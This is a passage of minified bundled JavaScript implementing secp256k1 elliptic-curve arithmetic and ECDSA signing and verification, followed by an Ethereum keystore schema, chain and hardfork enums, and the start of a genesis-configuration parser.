                        if (!r.eql(i, r.ZERO)) throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
                        if ("object" !== typeof n || "bigint" !== typeof n.beta || "function" !== typeof n.splitScalar) throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
                    }
                    return Object.freeze({ ...t
                    })
                }(e),
                {
                    Fp: n
                } = t,
                r = t.toBytes || ((e, t, r) => {
                    const i = t.toAffine();
                    return Tu(Uint8Array.from([4]), n.toBytes(i.x), n.toBytes(i.y))
                }),
                i = t.fromBytes || (e => {
                    const t = e.subarray(1);
                    return {
                        x: n.fromBytes(t.subarray(0, n.BYTES)),
                        y: n.fromBytes(t.subarray(n.BYTES, 2 * n.BYTES))
                    }
                });

            function o(e) {
                const {
                    a: r,
                    b: i
                } = t, o = n.sqr(e), a = n.mul(o, e);
                return n.add(n.add(a, n.mul(e, r)), i)
            }
            if (!n.eql(n.sqr(t.Gy), o(t.Gx))) throw new Error("bad generator point: equation left != right");

            function a(e) {
                return "bigint" === typeof e && od < e && e < t.n
            }

            function s(e) {
                if (!a(e)) throw new Error("Expected valid bigint: 0 < bigint < curve.n")
            }

            function c(e) {
                const {
                    allowedPrivateKeyLengths: n,
                    nByteLength: r,
                    wrapPrivateKey: i,
                    n: o
                } = t;
                if (n && "bigint" !== typeof e) {
                    if (yu(e) && (e = wu(e)), "string" !== typeof e || !n.includes(e.length)) throw new Error("Invalid key");
                    e = e.padStart(2 * r, "0")
                }
                let a;
                try {
                    a = "bigint" === typeof e ? e : Su(Pu("private key", e, r))
                } catch (c) {
                    throw new Error("private key must be ".concat(r, " bytes, hex or bigint, not ").concat(typeof e))
                }
                return i && (a = qu(a, o)), s(a), a
            }
            const l = new Map;

            function u(e) {
                if (!(e instanceof d)) throw new Error("ProjectivePoint expected")
            }
            class d {
                constructor(e, t, r) {
                    if (this.px = e, this.py = t, this.pz = r, null == e || !n.isValid(e)) throw new Error("x required");
                    if (null == t || !n.isValid(t)) throw new Error("y required");
                    if (null == r || !n.isValid(r)) throw new Error("z required")
                }
                static fromAffine(e) {
                    const {
                        x: t,
                        y: r
                    } = e || {};
                    if (!e || !n.isValid(t) || !n.isValid(r)) throw new Error("invalid affine point");
                    if (e instanceof d) throw new Error("projective point not allowed");
                    const i = e => n.eql(e, n.ZERO);
                    return i(t) && i(r) ? d.ZERO : new d(t, r, n.ONE)
                }
                get x() {
                    return this.toAffine().x
                }
                get y() {
                    return this.toAffine().y
                }
                static normalizeZ(e) {
                    const t = n.invertBatch(e.map((e => e.pz)));
                    return e.map(((e, n) => e.toAffine(t[n]))).map(d.fromAffine)
                }
                static fromHex(e) {
                    const t = d.fromAffine(i(Pu("pointHex", e)));
                    return t.assertValidity(), t
                }
                static fromPrivateKey(e) {
                    return d.BASE.multiply(c(e))
                }
                _setWindowSize(e) {
                    this._WINDOW_SIZE = e, l.delete(this)
                }
                assertValidity() {
                    if (this.is0()) {
                        if (t.allowInfinityPoint && !n.is0(this.py)) return;
                        throw new Error("bad point: ZERO")
                    }
                    const {
                        x: e,
                        y: r
                    } = this.toAffine();
                    if (!n.isValid(e) || !n.isValid(r)) throw new Error("bad point: x or y not FE");
                    const i = n.sqr(r),
                        a = o(e);
                    if (!n.eql(i, a)) throw new Error("bad point: equation left != right");
                    if (!this.isTorsionFree()) throw new Error("bad point: not in prime-order subgroup")
                }
                hasEvenY() {
                    const {
                        y: e
                    } = this.toAffine();
                    if (n.isOdd) return !n.isOdd(e);
                    throw new Error("Field doesn't support isOdd")
                }
                equals(e) {
                    u(e);
                    const {
                        px: t,
                        py: r,
                        pz: i
                    } = this, {
                        px: o,
                        py: a,
                        pz: s
                    } = e, c = n.eql(n.mul(t, s), n.mul(o, i)), l = n.eql(n.mul(r, s), n.mul(a, i));
                    return c && l
                }
                negate() {
                    return new d(this.px, n.neg(this.py), this.pz)
                }
                double() {
                    const {
                        a: e,
                        b: r
                    } = t, i = n.mul(r, sd), {
                        px: o,
                        py: a,
                        pz: s
                    } = this;
                    let c = n.ZERO,
                        l = n.ZERO,
                        u = n.ZERO,
                        f = n.mul(o, o),
                        h = n.mul(a, a),
                        p = n.mul(s, s),
                        m = n.mul(o, a);
                    return m = n.add(m, m), u = n.mul(o, s), u = n.add(u, u), c = n.mul(e, u), l = n.mul(i, p), l = n.add(c, l), c = n.sub(h, l), l = n.add(h, l), l = n.mul(c, l), c = n.mul(m, c), u = n.mul(i, u), p = n.mul(e, p), m = n.sub(f, p), m = n.mul(e, m), m = n.add(m, u), u = n.add(f, f), f = n.add(u, f), f = n.add(f, p), f = n.mul(f, m), l = n.add(l, f), p = n.mul(a, s), p = n.add(p, p), f = n.mul(p, m), c = n.sub(c, f), u = n.mul(p, h), u = n.add(u, u), u = n.add(u, u), new d(c, l, u)
                }
                add(e) {
                    u(e);
                    const {
                        px: r,
                        py: i,
                        pz: o
                    } = this, {
                        px: a,
                        py: s,
                        pz: c
                    } = e;
                    let l = n.ZERO,
                        f = n.ZERO,
                        h = n.ZERO;
                    const p = t.a,
                        m = n.mul(t.b, sd);
                    let g = n.mul(r, a),
                        v = n.mul(i, s),
                        y = n.mul(o, c),
                        b = n.add(r, i),
                        w = n.add(a, s);
                    b = n.mul(b, w), w = n.add(g, v), b = n.sub(b, w), w = n.add(r, o);
                    let x = n.add(a, c);
                    return w = n.mul(w, x), x = n.add(g, y), w = n.sub(w, x), x = n.add(i, o), l = n.add(s, c), x = n.mul(x, l), l = n.add(v, y), x = n.sub(x, l), h = n.mul(p, w), l = n.mul(m, y), h = n.add(l, h), l = n.sub(v, h), h = n.add(v, h), f = n.mul(l, h), v = n.add(g, g), v = n.add(v, g), y = n.mul(p, y), w = n.mul(m, w), v = n.add(v, y), y = n.sub(g, y), y = n.mul(p, y), w = n.add(w, y), g = n.mul(v, w), f = n.add(f, g), g = n.mul(x, w), l = n.mul(b, l), l = n.sub(l, g), g = n.mul(b, v), h = n.mul(x, h), h = n.add(h, g), new d(l, f, h)
                }
                subtract(e) {
                    return this.add(e.negate())
                }
                is0() {
                    return this.equals(d.ZERO)
                }
                wNAF(e) {
                    return h.wNAFCached(this, l, e, (e => {
                        const t = n.invertBatch(e.map((e => e.pz)));
                        return e.map(((e, n) => e.toAffine(t[n]))).map(d.fromAffine)
                    }))
                }
                multiplyUnsafe(e) {
                    const r = d.ZERO;
                    if (e === od) return r;
                    if (s(e), e === ad) return this;
                    const {
                        endo: i
                    } = t;
                    if (!i) return h.unsafeLadder(this, e);
                    let {
                        k1neg: o,
                        k1: a,
                        k2neg: c,
                        k2: l
                    } = i.splitScalar(e), u = r, f = r, p = this;
                    for (; a > od || l > od;) a & ad && (u = u.add(p)), l & ad && (f = f.add(p)), p = p.double(), a >>= ad, l >>= ad;
                    return o && (u = u.negate()), c && (f = f.negate()), f = new d(n.mul(f.px, i.beta), f.py, f.pz), u.add(f)
                }
                multiply(e) {
                    s(e);
                    let r, i, o = e;
                    const {
                        endo: a
                    } = t;
                    if (a) {
                        const {
                            k1neg: e,
                            k1: t,
                            k2neg: s,
                            k2: c
                        } = a.splitScalar(o);
                        let {
                            p: l,
                            f: u
                        } = this.wNAF(t), {
                            p: f,
                            f: p
                        } = this.wNAF(c);
                        l = h.constTimeNegate(e, l), f = h.constTimeNegate(s, f), f = new d(n.mul(f.px, a.beta), f.py, f.pz), r = l.add(f), i = u.add(p)
                    } else {
                        const {
                            p: e,
                            f: t
                        } = this.wNAF(o);
                        r = e, i = t
                    }
                    return d.normalizeZ([r, i])[0]
                }
                multiplyAndAddUnsafe(e, t, n) {
                    const r = d.BASE,
                        i = (e, t) => t !== od && t !== ad && e.equals(r) ? e.multiply(t) : e.multiplyUnsafe(t),
                        o = i(this, t).add(i(e, n));
                    return o.is0() ? void 0 : o
                }
                toAffine(e) {
                    const {
                        px: t,
                        py: r,
                        pz: i
                    } = this, o = this.is0();
                    null == e && (e = o ? n.ONE : n.inv(i));
                    const a = n.mul(t, e),
                        s = n.mul(r, e),
                        c = n.mul(i, e);
                    if (o) return {
                        x: n.ZERO,
                        y: n.ZERO
                    };
                    if (!n.eql(c, n.ONE)) throw new Error("invZ was invalid");
                    return {
                        x: a,
                        y: s
                    }
                }
                isTorsionFree() {
                    const {
                        h: e,
                        isTorsionFree: n
                    } = t;
                    if (e === ad) return !0;
                    if (n) return n(d, this);
                    throw new Error("isTorsionFree() has not been declared for the elliptic curve")
                }
                clearCofactor() {
                    const {
                        h: e,
                        clearCofactor: n
                    } = t;
                    return e === ad ? this : n ? n(d, this) : this.multiplyUnsafe(t.h)
                }
                toRawBytes() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return this.assertValidity(), r(d, this, e)
                }
                toHex() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return wu(this.toRawBytes(e))
                }
            }
            d.BASE = new d(t.Gx, t.Gy, n.ONE), d.ZERO = new d(n.ZERO, n.ONE, n.ZERO);
            const f = t.nBitLength,
                h = function(e, t) {
                    const n = (e, t) => {
                            const n = t.negate();
                            return e ? n : t
                        },
                        r = e => ({
                            windows: Math.ceil(t / e) + 1,
                            windowSize: 2 ** (e - 1)
                        });
                    return {
                        constTimeNegate: n,
                        unsafeLadder(t, n) {
                            let r = e.ZERO,
                                i = t;
                            for (; n > $u;) n & ed && (r = r.add(i)), i = i.double(), n >>= ed;
                            return r
                        },
                        precomputeWindow(e, t) {
                            const {
                                windows: n,
                                windowSize: i
                            } = r(t), o = [];
                            let a = e,
                                s = a;
                            for (let r = 0; r < n; r++) {
                                s = a, o.push(s);
                                for (let e = 1; e < i; e++) s = s.add(a), o.push(s);
                                a = s.double()
                            }
                            return o
                        },
                        wNAF(t, i, o) {
                            const {
                                windows: a,
                                windowSize: s
                            } = r(t);
                            let c = e.ZERO,
                                l = e.BASE;
                            const u = BigInt(2 ** t - 1),
                                d = 2 ** t,
                                f = BigInt(t);
                            for (let e = 0; e < a; e++) {
                                const t = e * s;
                                let r = Number(o & u);
                                o >>= f, r > s && (r -= d, o += ed);
                                const a = t,
                                    h = t + Math.abs(r) - 1,
                                    p = e % 2 !== 0,
                                    m = r < 0;
                                0 === r ? l = l.add(n(p, i[a])) : c = c.add(n(m, i[h]))
                            }
                            return {
                                p: c,
                                f: l
                            }
                        },
                        wNAFCached(e, t, n, r) {
                            const i = e._WINDOW_SIZE || 1;
                            let o = t.get(e);
                            return o || (o = this.precomputeWindow(e, i), 1 !== i && t.set(e, r(o))), this.wNAF(i, o, n)
                        }
                    }
                }(d, t.endo ? Math.ceil(f / 2) : f);
            return {
                CURVE: t,
                ProjectivePoint: d,
                normPrivateKeyToScalar: c,
                weierstrassEquation: o,
                isWithinCurveOrder: a
            }
        }

        function ld(e) {
            const t = function(e) {
                    const t = td(e);
                    return ju(t, {
                        hash: "hash",
                        hmac: "function",
                        randomBytes: "function"
                    }, {
                        bits2int: "function",
                        bits2int_modN: "function",
                        lowS: "boolean"
                    }), Object.freeze({
                        lowS: !0,
                        ...t
                    })
                }(e),
                {
                    Fp: n,
                    n: r
                } = t,
                i = n.BYTES + 1,
                o = 2 * n.BYTES + 1;

            function a(e) {
                return qu(e, r)
            }

            function s(e) {
                return Vu(e, r)
            }
            const {
                ProjectivePoint: c,
                normPrivateKeyToScalar: l,
                weierstrassEquation: u,
                isWithinCurveOrder: d
            } = cd({ ...t,
                toBytes(e, t, r) {
                    const i = t.toAffine(),
                        o = n.toBytes(i.x),
                        a = Tu;
                    return r ? a(Uint8Array.from([t.hasEvenY() ? 2 : 3]), o) : a(Uint8Array.from([4]), o, n.toBytes(i.y))
                },
                fromBytes(e) {
                    const t = e.length,
                        r = e[0],
                        a = e.subarray(1);
                    if (t !== i || 2 !== r && 3 !== r) {
                        if (t === o && 4 === r) {
                            return {
                                x: n.fromBytes(a.subarray(0, n.BYTES)),
                                y: n.fromBytes(a.subarray(n.BYTES, 2 * n.BYTES))
                            }
                        }
                        throw new Error("Point of length ".concat(t, " was invalid. Expected ").concat(i, " compressed bytes or ").concat(o, " uncompressed bytes"))
                    } {
                        const e = Su(a);
                        if (!(od < (s = e) && s < n.ORDER)) throw new Error("Point is not on curve");
                        const t = u(e);
                        let i = n.sqrt(t);
                        return 1 === (1 & r) !== ((i & ad) === ad) && (i = n.neg(i)), {
                            x: e,
                            y: i
                        }
                    }
                    var s
                }
            }), f = e => wu(_u(e, t.nByteLength));

            function h(e) {
                return e > r >> ad
            }
            const p = (e, t, n) => Su(e.slice(t, n));
            class m {
                constructor(e, t, n) {
                    this.r = e, this.s = t, this.recovery = n, this.assertValidity()
                }
                static fromCompact(e) {
                    const n = t.nByteLength;
                    return e = Pu("compactSignature", e, 2 * n), new m(p(e, 0, n), p(e, n, 2 * n))
                }
                static fromDER(e) {
                    const {
                        r: t,
                        s: n
                    } = id.toSig(Pu("DER", e));
                    return new m(t, n)
                }
                assertValidity() {
                    if (!d(this.r)) throw new Error("r must be 0 < r < CURVE.n");
                    if (!d(this.s)) throw new Error("s must be 0 < s < CURVE.n")
                }
                addRecoveryBit(e) {
                    return new m(this.r, this.s, e)
                }
                recoverPublicKey(e) {
                    const {
                        r: r,
                        s: i,
                        recovery: o
                    } = this, l = b(Pu("msgHash", e));
                    if (null == o || ![0, 1, 2, 3].includes(o)) throw new Error("recovery id invalid");
                    const u = 2 === o || 3 === o ? r + t.n : r;
                    if (u >= n.ORDER) throw new Error("recovery id 2 or 3 invalid");
                    const d = 0 === (1 & o) ? "02" : "03",
                        h = c.fromHex(d + f(u)),
                        p = s(u),
                        m = a(-l * p),
                        g = a(i * p),
                        v = c.BASE.multiplyAndAddUnsafe(h, m, g);
                    if (!v) throw new Error("point at infinify");
                    return v.assertValidity(), v
                }
                hasHighS() {
                    return h(this.s)
                }
                normalizeS() {
                    return this.hasHighS() ? new m(this.r, a(-this.s), this.recovery) : this
                }
                toDERRawBytes() {
                    return Eu(this.toDERHex())
                }
                toDERHex() {
                    return id.hexFromSig({
                        r: this.r,
                        s: this.s
                    })
                }
                toCompactRawBytes() {
                    return Eu(this.toCompactHex())
                }
                toCompactHex() {
                    return f(this.r) + f(this.s)
                }
            }
            const g = {
                isValidPrivateKey(e) {
                    try {
                        return l(e), !0
                    } catch (t) {
                        return !1
                    }
                },
                normPrivateKeyToScalar: l,
                randomPrivateKey: () => {
                    const e = Xu(t.n);
                    return function(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                        const r = e.length,
                            i = Yu(t),
                            o = Xu(t);
                        if (r < 16 || r < o || r > 1024) throw new Error("expected ".concat(o, "-1024 bytes of input, got ").concat(r));
                        const a = qu(n ? Su(e) : Cu(e), t - Lu) + Lu;
                        return n ? Iu(a, i) : _u(a, i)
                    }(t.randomBytes(e), t.n)
                },
                precompute() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8,
                        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : c.BASE;
                    return t._setWindowSize(e), t.multiply(BigInt(3)), t
                }
            };

            function v(e) {
                const t = yu(e),
                    n = "string" === typeof e,
                    r = (t || n) && e.length;
                return t ? r === i || r === o : n ? r === 2 * i || r === 2 * o : e instanceof c
            }
            const y = t.bits2int || function(e) {
                    const n = Su(e),
                        r = 8 * e.length - t.nBitLength;
                    return r > 0 ? n >> BigInt(r) : n
                },
                b = t.bits2int_modN || function(e) {
                    return a(y(e))
                },
                w = Bu(t.nBitLength);

            function x(e) {
                if ("bigint" !== typeof e) throw new Error("bigint expected");
                if (!(od <= e && e < w)) throw new Error("bigint expected < 2^".concat(t.nBitLength));
                return _u(e, t.nByteLength)
            }

            function A(e, r) {
                let i = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : k;
                if (["recovered", "canonical"].some((e => e in i))) throw new Error("sign() legacy options not supported");
                const {
                    hash: o,
                    randomBytes: u
                } = t;
                let {
                    lowS: f,
                    prehash: p,
                    extraEntropy: g
                } = i;
                null == f && (f = !0), e = Pu("msgHash", e), p && (e = Pu("prehashed msgHash", o(e)));
                const v = b(e),
                    w = l(r),
                    A = [x(w), x(v)];
                if (null != g) {
                    const e = !0 === g ? u(n.BYTES) : g;
                    A.push(Pu("extraEntropy", e))
                }
                const E = Tu(...A),
                    S = v;
                return {
                    seed: E,
                    k2sig: function(e) {
                        const t = y(e);
                        if (!d(t)) return;
                        const n = s(t),
                            r = c.BASE.multiply(t).toAffine(),
                            i = a(r.x);
                        if (i === od) return;
                        const o = a(n * a(S + i * w));
                        if (o === od) return;
                        let l = (r.x === i ? 0 : 2) | Number(r.y & ad),
                            u = o;
                        return f && h(o) && (u = function(e) {
                            return h(e) ? a(-e) : e
                        }(o), l ^= 1), new m(i, u, l)
                    }
                }
            }
            const k = {
                    lowS: t.lowS,
                    prehash: !1
                },
                E = {
                    lowS: t.lowS,
                    prehash: !1
                };
            return c.BASE._setWindowSize(8), {
                CURVE: t,
                getPublicKey: function(e) {
                    let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    return c.fromPrivateKey(e).toRawBytes(t)
                },
                getSharedSecret: function(e, t) {
                    let n = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    if (v(e)) throw new Error("first arg must be private key");
                    if (!v(t)) throw new Error("second arg must be public key");
                    return c.fromHex(t).multiply(l(e)).toRawBytes(n)
                },
                sign: function(e, n) {
                    let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : k;
                    const {
                        seed: i,
                        k2sig: o
                    } = A(e, n, r), a = t;
                    return Ru(a.hash.outputLen, a.nByteLength, a.hmac)(i, o)
                },
                verify: function(e, n, r) {
                    var i;
                    let o = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : E;
                    const l = e;
                    if (n = Pu("msgHash", n), r = Pu("publicKey", r), "strict" in o) throw new Error("options.strict was renamed to lowS");
                    const {
                        lowS: u,
                        prehash: d
                    } = o;
                    let f, h;
                    try {
                        if ("string" === typeof l || yu(l)) try {
                            f = m.fromDER(l)
                        } catch (k) {
                            if (!(k instanceof id.Err)) throw k;
                            f = m.fromCompact(l)
                        } else {
                            if ("object" !== typeof l || "bigint" !== typeof l.r || "bigint" !== typeof l.s) throw new Error("PARSE"); {
                                const {
                                    r: e,
                                    s: t
                                } = l;
                                f = new m(e, t)
                            }
                        }
                        h = c.fromHex(r)
                    } catch (S) {
                        if ("PARSE" === S.message) throw new Error("signature must be Signature instance, Uint8Array or hex string");
                        return !1
                    }
                    if (u && f.hasHighS()) return !1;
                    d && (n = t.hash(n));
                    const {
                        r: p,
                        s: g
                    } = f, v = b(n), y = s(g), w = a(v * y), x = a(p * y), A = null === (i = c.BASE.multiplyAndAddUnsafe(h, w, x)) || void 0 === i ? void 0 : i.toAffine();
                    return !!A && a(A.x) === p
                },
                ProjectivePoint: c,
                Signature: m,
                utils: g
            }
        }

        function ud(e) {
            return {
                hash: e,
                hmac: function(t) {
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    return Ql(e, t, Dr(...r))
                },
                randomBytes: qr
            }
        }
        const dd = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),
            fd = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),
            hd = BigInt(1),
            pd = BigInt(2),
            md = (e, t) => (e + t / pd) / t;

        function gd(e) {
            const t = dd,
                n = BigInt(3),
                r = BigInt(6),
                i = BigInt(11),
                o = BigInt(22),
                a = BigInt(23),
                s = BigInt(44),
                c = BigInt(88),
                l = e * e * e % t,
                u = l * l * e % t,
                d = Wu(u, n, t) * u % t,
                f = Wu(d, n, t) * u % t,
                h = Wu(f, pd, t) * l % t,
                p = Wu(h, i, t) * h % t,
                m = Wu(p, o, t) * p % t,
                g = Wu(m, s, t) * m % t,
                v = Wu(g, c, t) * g % t,
                y = Wu(v, s, t) * m % t,
                b = Wu(y, n, t) * u % t,
                w = Wu(b, a, t) * p % t,
                x = Wu(w, r, t) * l % t,
                A = Wu(x, pd, t);
            if (!vd.eql(vd.sqr(A), e)) throw new Error("Cannot find square root");
            return A
        }
        const vd = function(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                if (e <= Fu) throw new Error("Expected Field ORDER > 0, got ".concat(e));
                const {
                    nBitLength: i,
                    nByteLength: o
                } = Ju(e, t);
                if (o > 2048) throw new Error("Field lengths over 2048 bytes are not supported");
                const a = Zu(e),
                    s = Object.freeze({
                        ORDER: e,
                        BITS: i,
                        BYTES: o,
                        MASK: Bu(i),
                        ZERO: Fu,
                        ONE: Lu,
                        create: t => qu(t, e),
                        isValid: t => {
                            if ("bigint" !== typeof t) throw new Error("Invalid field element: expected bigint, got ".concat(typeof t));
                            return Fu <= t && t < e
                        },
                        is0: e => e === Fu,
                        isOdd: e => (e & Lu) === Lu,
                        neg: t => qu(-t, e),
                        eql: (e, t) => e === t,
                        sqr: t => qu(t * t, e),
                        add: (t, n) => qu(t + n, e),
                        sub: (t, n) => qu(t - n, e),
                        mul: (t, n) => qu(t * n, e),
                        pow: (e, t) => function(e, t, n) {
                            if (n < Fu) throw new Error("Expected power > 0");
                            if (n === Fu) return e.ONE;
                            if (n === Lu) return t;
                            let r = e.ONE,
                                i = t;
                            for (; n > Fu;) n & Lu && (r = e.mul(r, i)), i = e.sqr(i), n >>= Lu;
                            return r
                        }(s, e, t),
                        div: (t, n) => qu(t * Vu(n, e), e),
                        sqrN: e => e * e,
                        addN: (e, t) => e + t,
                        subN: (e, t) => e - t,
                        mulN: (e, t) => e * t,
                        inv: t => Vu(t, e),
                        sqrt: r.sqrt || (e => a(s, e)),
                        invertBatch: e => function(e, t) {
                            const n = new Array(t.length),
                                r = t.reduce(((t, r, i) => e.is0(r) ? t : (n[i] = t, e.mul(t, r))), e.ONE),
                                i = e.inv(r);
                            return t.reduceRight(((t, r, i) => e.is0(r) ? t : (n[i] = e.mul(t, n[i]), e.mul(t, r))), i), n
                        }(s, e),
                        cmov: (e, t, n) => n ? t : e,
                        toBytes: e => n ? Iu(e, o) : _u(e, o),
                        fromBytes: e => {
                            if (e.length !== o) throw new Error("Fp.fromBytes: expected ".concat(o, ", got ").concat(e.length));
                            return n ? Cu(e) : Su(e)
                        }
                    });
                return Object.freeze(s)
            }(dd, void 0, void 0, {
                sqrt: gd
            }),
            yd = function(e, t) {
                const n = t => ld({ ...e,
                    ...ud(t)
                });
                return Object.freeze({ ...n(t),
                    create: n
                })
            }({
                a: BigInt(0),
                b: BigInt(7),
                Fp: vd,
                n: fd,
                Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
                Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
                h: BigInt(1),
                lowS: !0,
                endo: {
                    beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
                    splitScalar: e => {
                        const t = fd,
                            n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                            r = -hd * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                            i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                            o = n,
                            a = BigInt("0x100000000000000000000000000000000"),
                            s = md(o * e, t),
                            c = md(-r * e, t);
                        let l = qu(e - s * n - c * i, t),
                            u = qu(-s * r - c * o, t);
                        const d = l > a,
                            f = u > a;
                        if (d && (l = t - l), f && (u = t - u), l > a || u > a) throw new Error("splitScalar: Endomorphism failed, k=" + e);
                        return {
                            k1neg: d,
                            k1: l,
                            k2neg: f,
                            k2: u
                        }
                    }
                }
            }, nu);
        BigInt(0);
        yd.ProjectivePoint;
        var bd;
        const wd = null !== (bd = yd) && void 0 !== bd ? bd : o,
            xd = BigInt("0xffffffffffffffff"),
            Ad = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
            kd = wd.CURVE.n / BigInt(2),
            Ed = {
                type: "object",
                required: ["crypto", "id", "version", "address"],
                properties: {
                    crypto: {
                        type: "object",
                        required: ["cipher", "ciphertext", "cipherparams", "kdf", "kdfparams", "mac"],
                        properties: {
                            cipher: {
                                type: "string"
                            },
                            ciphertext: {
                                type: "string"
                            },
                            cipherparams: {
                                type: "object"
                            },
                            kdf: {
                                type: "string"
                            },
                            kdfparams: {
                                type: "object"
                            },
                            salt: {
                                type: "string"
                            },
                            mac: {
                                type: "string"
                            }
                        }
                    },
                    id: {
                        type: "string"
                    },
                    version: {
                        type: "number"
                    },
                    address: {
                        type: "string"
                    }
                }
            };
        var Sd, Cd, _d, Id, Pd, Td;
        ! function(e) {
            e[e.Mainnet = 1] = "Mainnet", e[e.Goerli = 5] = "Goerli", e[e.Sepolia = 11155111] = "Sepolia"
        }(Sd || (Sd = {})),
        function(e) {
            e.Chainstart = "chainstart", e.Homestead = "homestead", e.Dao = "dao", e.TangerineWhistle = "tangerineWhistle", e.SpuriousDragon = "spuriousDragon", e.Byzantium = "byzantium", e.Constantinople = "constantinople", e.Petersburg = "petersburg", e.Istanbul = "istanbul", e.MuirGlacier = "muirGlacier", e.Berlin = "berlin", e.London = "london", e.ArrowGlacier = "arrowGlacier", e.GrayGlacier = "grayGlacier", e.MergeForkIdTransition = "mergeForkIdTransition", e.Merge = "merge", e.Shanghai = "shanghai", e.ShardingForkDev = "shardingFork"
        }(Cd || (Cd = {})),
        function(e) {
            e.ProofOfStake = "pos", e.ProofOfWork = "pow", e.ProofOfAuthority = "poa"
        }(_d || (_d = {})),
        function(e) {
            e.Ethash = "ethash", e.Clique = "clique", e.Casper = "casper"
        }(Id || (Id = {})),
        function(e) {
            e.PolygonMainnet = "polygon-mainnet", e.PolygonMumbai = "polygon-mumbai", e.ArbitrumRinkebyTestnet = "arbitrum-rinkeby-testnet", e.ArbitrumOne = "arbitrum-one", e.xDaiChain = "x-dai-chain", e.OptimisticKovan = "optimistic-kovan", e.OptimisticEthereum = "optimistic-ethereum"
        }(Pd || (Pd = {})),
        function(e) {
            e[e.Number = 0] = "Number", e[e.BigInt = 1] = "BigInt", e[e.Uint8Array = 2] = "Uint8Array", e[e.PrefixedHexString = 3] = "PrefixedHexString"
        }(Td || (Td = {}));
        const Bd = e => {
            if ("string" !== typeof e) throw new Error("[stripHexPrefix] input must be type 'string', received ".concat(typeof e));
            return Ta(e) ? e.slice(2) : e
        };
        const Nd = function(e) {
            if (!Number.isSafeInteger(e) || e < 0) throw new Error("Received an invalid integer type: ".concat(e));
            return "0x".concat(e.toString(16))
        };

        function Od(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            var n, r;
            const {
                name: i,
                config: o,
                difficulty: a,
                mixHash: s,
                gasLimit: c,
                coinbase: l,
                baseFeePerGas: u
            } = e;
            let {
                extraData: d,
                timestamp: f,
                nonce: h
            } = e;
            const p = Number(f),
                {
                    chainId: m
                } = o;
            if ("" === d && (d = "0x"), Ta(f) || (f = Nd(parseInt(f))), 18 !== h.length && (h = function(e) {
                    return e && "0x0" !== e ? Ta(e) ? "0x".concat(Bd(e).padStart(16, "0")) : "0x".concat(e.padStart(16, "0")) : "0x0000000000000000"
                }(h)), o.eip155Block !== o.eip158Block) throw new Error("EIP155 block number must equal EIP 158 block number since both are part of SpuriousDragon hardfork and the client only supports activating the full hardfork");
            const g = {
                    name: i,
                    chainId: m,
                    networkId: m,
                    genesis: {
                        timestamp: f,
                        gasLimit: parseInt(c),
                        difficulty: parseInt(a),
                        nonce: h,
                        extraData: d,
                        mixHash: s,
                        coinbase: l,
                        baseFeePerGas: u
                    },
                    hardfork: void 0,
                    hardforks: [],
                    bootstrapNodes: [],
                    consensus: void 0 !== o.clique ? {
                        type: "poa",
                        algorithm: "clique",
                        clique: {
                            period: null !== (n = o.clique.period) && void 0 !== n ? n : o.clique.blockperiodseconds,
                            epoch: null !== (r = o.clique.epoch) && void 0 !== r ? r : o.clique.epochlength
                        }
                    } : {
                        type: "pow",
                        algorithm: "ethash",
                        ethash: {}
                    }
                },
                v = {
                    [Cd.Homestead]: {
                        name: "homesteadBlock"
                    },
                    [Cd.Dao]: {
                        name: "daoForkBlock"
                    },
                    [Cd.TangerineWhistle]: {
                        name: "eip150Block"
                    },
                    [Cd.SpuriousDragon]: {
                        name: "eip155Block"
                    },
                    [Cd.Byzantium]: {
                        name: "byzantiumBlock"
                    },
                    [Cd.Constantinople]: {
                        name: "constantinopleBlock"
                    },
                    [Cd.Petersburg]: {
                        name: "petersburgBlock"
                    },
                    [Cd.Istanbul]: {
                        name: "istanbulBlock"
                    },
                    [Cd.MuirGlacier]: {
                        name: "muirGlacierBlock"
                    },
                    [Cd.Berlin]: {
                        name: "berlinBlock"
                    },
                    [Cd.London]: {
                        name: "londonBlock"
                    },
                    [Cd.MergeForkIdTransition]: {
                        name: "mergeForkBlock",
                        postMerge: t
                    },
                    [Cd.Shanghai]: {
                        name: "shanghaiTime",
                        postMerge: !0,
                        isTimestamp: !0
                    },
                    [Cd.ShardingForkDev]: {
                        name: "shardingForkTime",
                        postMerge: !0,
                        isTimestamp: !0
                    }
                },
                y = Object.keys(v).reduce(((e, t) => (e[v[t].name] = t, e)), {}),
                b = Object.keys(o).filter((e => void 0 !== y[e] && void 0 !== o[e] && null !== o[e]));
            if (g.hardforks = b.map((e => ({
                    name: y[e],
                    block: !0 === v[y[e]].isTimestamp || "number" !== typeof o[e] ? null : o[e],
                    timestamp: !0 === v[y[e]].isTimestamp && "number" === typeof o[e] ? o[e] : void 0
                }))).filter((e => null !== e.block || void 0 !== e.timestamp)), g.hardforks.sort(((e, t) => {
                    var n, r;
